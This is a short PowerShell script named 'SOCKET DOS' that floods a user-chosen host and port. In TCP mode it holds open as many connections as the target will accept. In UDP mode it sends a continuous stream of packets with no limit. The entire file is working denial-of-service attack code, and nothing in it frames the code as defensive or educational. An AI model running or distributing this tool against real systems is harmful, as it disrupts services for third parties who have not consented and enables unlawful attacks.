Clear-Host

$Host.UI.RawUI.WindowTitle = "SOCKET DOS"

$connect_delay_ms = 100
$udp_packet_size_bytes = 1024
$udp_progress_interval = 10000

$protocol = ""
while ($protocol -ne "TCP" -and $protocol -ne "UDP") {
    $answer = Read-Host -Prompt "Protocol - (T)CP or (U)DP?"
    if ($answer -match '^(T|TCP)$') { $protocol = "TCP" }
    if ($answer -match '^(U|UDP)$') { $protocol = "UDP" }
}

$host_address = Read-Host -Prompt "Target host"

$port_number = 0
while ($port_number -lt 1 -or $port_number -gt 65535) {
    $answer = Read-Host -Prompt "Target port (1-65535)"
    if ($answer -match '^\d+$') { $port_number = [int]$answer }
}

Write-Host "-------------------------------- SOCKET DOS $protocol --------------------------------" -ForegroundColor Yellow

if ($protocol -eq "TCP") {
    Write-Host "Flooding $host_address`:$port_number with TCP connections (Ctrl+C to stop and release)..." -ForegroundColor Yellow
    $connections = New-Object System.Collections.Generic.List[System.Net.Sockets.TcpClient]
    try {
        while ($true) {
            $client = New-Object System.Net.Sockets.TcpClient
            try {
                $client.Connect($host_address, $port_number)
                $connections.Add($client)
                Write-Host "Held open: $($connections.Count) connections"
                Start-Sleep -Milliseconds $connect_delay_ms
            } catch {
                Write-Host "Connect failed after $($connections.Count) connections held; holding them open (Ctrl+C to release)" -ForegroundColor Red
                while ($true) { Start-Sleep -Milliseconds 500 }
            }
        }
    } finally {
        foreach ($client in $connections) { $client.Close() }
    }
} else {
    Write-Host "Flooding $host_address`:$port_number with UDP packets (Ctrl+C to stop)..." -ForegroundColor Yellow
    $sender = New-Object System.Net.Sockets.UdpClient
    $sender.Connect($host_address, $port_number)
    $packet = New-Object byte[] $udp_packet_size_bytes
    try {
        $sent_count = 0
        while ($true) {
            $sender.Send($packet, $packet.Length) | Out-Null
            $sent_count++
            if ($sent_count % $udp_progress_interval -eq 0) {
                Write-Host "Sent: $sent_count packets"
            }
        }
    } finally {
        $sender.Close()
    }
}
